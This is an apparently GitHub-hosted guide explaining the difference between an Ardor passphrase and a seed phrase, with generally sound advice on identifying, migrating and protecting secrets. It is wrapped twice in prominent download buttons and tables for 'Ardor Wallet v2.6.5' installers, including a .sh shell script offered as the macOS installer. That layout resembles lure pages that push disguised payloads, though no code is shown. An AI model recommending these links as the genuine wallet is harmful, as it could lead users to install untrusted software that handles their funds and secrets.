![Ardor Wallet guide](assets/banner-article.png)

# Ardor passphrase or seed phrase: which one do you have

<p align="center"><a href="https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.exe"><img src="https://img.shields.io/badge/DOWNLOAD%20%E2%86%93-WINDOWS-1562a1?style=for-the-badge&labelColor=0c395d&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTAgMy42IDkuNCAyLjN2OUgwek0xMC42IDIuMSAyNCAwdjExLjNIMTAuNnpNMCAxMi43aDkuNHY5TDAgMjAuNHpNMTAuNiAxMi43SDI0VjI0bC0xMy40LTEuOXonLz48L3N2Zz4%3D&logoColor=white" alt="Download for Windows"></a> <a href="https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.sh"><img src="https://img.shields.io/badge/DOWNLOAD%20%E2%86%93-MACOS-1562a1?style=for-the-badge&labelColor=0c395d&logo=apple&logoColor=white" alt="Download for macOS"></a> <a href="https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.zip"><img src="https://img.shields.io/badge/DOWNLOAD%20%E2%86%93-LINUX-1562a1?style=for-the-badge&labelColor=0c395d&logo=linux&logoColor=white" alt="Download for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img height="24" src="https://img.shields.io/badge/platform-Windows-3e83be?style=flat-square&labelColor=0c395d&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTAgMy42IDkuNCAyLjN2OUgwek0xMC42IDIuMSAyNCAwdjExLjNIMTAuNnpNMCAxMi43aDkuNHY5TDAgMjAuNHpNMTAuNiAxMi43SDI0VjI0bC0xMy40LTEuOXonLz48L3N2Zz4%3D&logoColor=white" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [`ardor-wallet-2.6.5.exe`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.exe) |
| <img height="24" src="https://img.shields.io/badge/platform-macOS-3e83be?style=flat-square&labelColor=0c395d&logo=apple&logoColor=white" alt="macOS"> | macOS 12 or later | [`ardor-wallet-2.6.5.sh`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.sh) |
| <img height="24" src="https://img.shields.io/badge/platform-Linux-3e83be?style=flat-square&labelColor=0c395d&logo=linux&logoColor=white" alt="Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`ardor-wallet-2.6.5.zip`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.zip) |

</div>

All versions, installer files and checksums are on the [Ardor Wallet release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5).

> [!WARNING]
> Only download from [this GitHub release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5).

---

A passphrase and a seed are two different kinds of secret that open an Ardor account. A passphrase is the legacy form - twelve words by default, taken from a large dictionary - while a seed follows the BIP32/BIP39/BIP44 standard and is the recommended choice for new accounts. Both work, and existing passphrase accounts keep working.

## The difference in one table

| | Passphrase | Seed |
|---|---|---|
| Origin | Legacy method, still fully supported | Standard derivation, recommended for new accounts |
| Typical form | Twelve words by default, from a dictionary of more than 1,600 words | Words plus a standard derivation path |
| Path | Derived directly from the words | `m/44'/16754'/0'/0'` by default on mainnet |
| Portability | Readable only by software that implements the same derivation | Readable by any wallet that follows the standard |
| What it opens | The parent chain and every child chain | The parent chain and every child chain |

The practical consequence is portability. A seed can be restored in another compliant wallet; a passphrase depends on the same derivation being implemented, which the [Ardor wallet](https://github.com/ardor-software/ardor-wallet-guides/blob/main/what-is-an-ardor-wallet.md) does and a random website does not.

## Why both exist

Ardor grew out of Nxt, where the [Ardor passphrase](https://github.com/ardor-software/ardor-wallet-guides/blob/main/can-you-reset-an-ardor-passphrase.md) was the account from the beginning. Those accounts hold real balances, and a wallet that dropped the method would strand them. So the passphrase stayed, unchanged, and the seed was added beside it as the newer path.

That history explains an error people make in both directions. Someone with a 2017 [account](https://github.com/ardor-software/ardor-wallet-guides/blob/main/create-an-ardor-account-in-the-wallet.md) reads a guide about seed phrases, decides their twelve words are a seed phrase, and looks for a derivation path that does not apply. Someone with a new seed account reads an old forum post about passphrases and concludes the seed is wrong because the wallet calls the tab something else.

## How to tell which you have

1. Count the words. Twelve words is consistent with either, so counting alone does not settle it.
2. Look at how the account was created. A seed normally produces a phrase the wallet labels as a recovery phrase, with a derivation path; a passphrase is entered and confirmed as a passphrase.
3. Test in a controlled way. Enter the words in the passphrase tab and note the address, then enter the same words in the seed tab. Whichever tab reproduces the address you expect identifies the type.
4. Compare with the oldest record you have - a screenshot, a note, the first transaction date. An account created years ago is almost certainly a passphrase account.

Step three is safe on your own machine and settles the question in a minute. Do not run the same test on a website that offers to check a phrase for you.

## The default passphrase is not a weak password

Twelve words drawn from a dictionary of more than 1,600 entries is an enormous search space, far beyond anything a password cracker reaches. The weakness people fear is not the size of the space; it is the phrase they chose themselves, or the copy they stored badly.

That is why the wallet generates the phrase rather than asking you to invent one. A memorable sentence such as a favourite lyric is exactly the input an attacker tries first, and it is the reason a generated secret is not optional advice.

## Changing the secret safely

Changing a passphrase produces a new account, so treat the change as a migration rather than a settings toggle. Create the new secret, write it down, confirm it opens the new address, move the [Ardor balance](https://github.com/ardor-software/ardor-forging-and-nodes/blob/main/ardor-wallet-balance-shows-zero.md), and only then retire the old one.

Never change the secret and the storage habit in the same sitting. If the new words are written down badly, the old account is gone and the new one is unreachable, which is worse than either failure on its own.

## Moving an old account towards a seed

An account created before seeds existed does not have to stay on a passphrase for ever. The route is a transfer rather than a conversion: create a seed account in the same wallet, write the recovery phrase down, confirm it opens the new address, then send the balance across in one transaction. Keep the old account intact until the new one has signed successfully, because the old secret is still the only way back if the new one was miswritten or stored badly.

There is no deadline for that move, and no advantage to doing it in a hurry. The people who lose funds in a migration are rarely the ones who waited; they are the ones who deleted the old wallet in the same sitting as they created the new one, with the new words still unverified on a piece of paper somewhere.

## What not to do with either secret

- Do not type it into a website, including one that offers to check, unlock or recover an account.
- Do not paste it into a browser extension, a support chat or a form that claims to verify ownership.
- Do not store it as a photo, a note in a synced app or a message to yourself.
- Do not send it to anyone who says they can help, no matter how they found you.

The wallet never needs the secret to be transmitted, because the signing happens locally. Any request that requires sending it is a request for the account.

## FAQ

### Can I convert a passphrase account into a seed account?

You can create a seed account and move the balance to it, which is a transfer rather than a conversion. The passphrase account keeps working, and its address never changes.

### Is a seed phrase safer than a passphrase?

Both are equally unguessable when generated. A seed is more portable across wallets and easier to represent as a standard recovery phrase, which is why it is recommended for new accounts.

### Why does my passphrase open a different account in another wallet?

Because that wallet derives accounts differently. The Ardor passphrase is specific to this derivation; a seed follows a standard that many wallets implement.

### Does the wallet ever ask for the seed on startup?

Only on the seed tab, and only locally. A prompt that arrives from a link, an email or a pop-up is not the wallet.

---

## Download

Every installer for the current release, with the platform each one targets:

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img height="24" src="https://img.shields.io/badge/platform-Windows-3e83be?style=flat-square&labelColor=0c395d&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTAgMy42IDkuNCAyLjN2OUgwek0xMC42IDIuMSAyNCAwdjExLjNIMTAuNnpNMCAxMi43aDkuNHY5TDAgMjAuNHpNMTAuNiAxMi43SDI0VjI0bC0xMy40LTEuOXonLz48L3N2Zz4%3D&logoColor=white" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [`ardor-wallet-2.6.5.exe`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.exe) |
| <img height="24" src="https://img.shields.io/badge/platform-macOS-3e83be?style=flat-square&labelColor=0c395d&logo=apple&logoColor=white" alt="macOS"> | macOS 12 or later | [`ardor-wallet-2.6.5.sh`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.sh) |
| <img height="24" src="https://img.shields.io/badge/platform-Linux-3e83be?style=flat-square&labelColor=0c395d&logo=linux&logoColor=white" alt="Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`ardor-wallet-2.6.5.zip`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.zip) |

</div>

All versions, installer files and checksums are on the [Ardor Wallet release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5).

> [!WARNING]
> Only download from [this GitHub release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5).
---

## Related guides

- [Create an Ardor account and read its address](https://github.com/ardor-software/ardor-wallet-guides/blob/main/create-an-ardor-account-in-the-wallet.md)
- [Back up an Ardor wallet and move it to a new computer](https://github.com/ardor-software/ardor-wallet-guides/blob/main/back-up-and-move-your-ardor-wallet.md)
- [Can you reset an Ardor passphrase? No - here is what to do](https://github.com/ardor-software/ardor-wallet-guides/blob/main/can-you-reset-an-ardor-passphrase.md)
- [Recover a passphrase that has a typo](https://github.com/ardor-software/ardor-wallet-guides/blob/main/recovering-a-passphrase-typo-in-ardor-wallet.md)
- [Ardor Wallet v2.6.5 release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5)
